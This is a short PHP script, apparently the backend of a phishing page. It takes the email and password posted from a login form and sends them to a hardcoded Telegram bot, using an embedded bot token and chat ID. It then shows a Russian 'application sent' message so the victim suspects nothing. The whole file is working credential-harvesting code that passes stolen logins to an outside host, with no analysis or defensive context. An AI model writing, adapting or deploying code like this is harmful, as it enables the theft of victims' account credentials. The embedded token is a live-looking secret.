<?php
$name = $_POST['email'];
$pass = $_POST['password'];

$telegram_api_key = '6918416164:AAGdVkX8XCbx5q1vtRAFEm54uT7ZRd6jO-0';

$chat_id = '993175437';

$message = "Новый вход:\nЕмали: $name\nНомер Пароль: $pass";

$telegram_url = "https://api.telegram.org/bot$telegram_api_key/sendMessage?chat_id=$chat_id&text=" . urlencode($message);

$response = file_get_contents($telegram_url);

if ($response === false) {
    echo 'Ошибка при отправке заявки.';
} else {
    echo 'Заявка успешно отправлена.';
}
?>
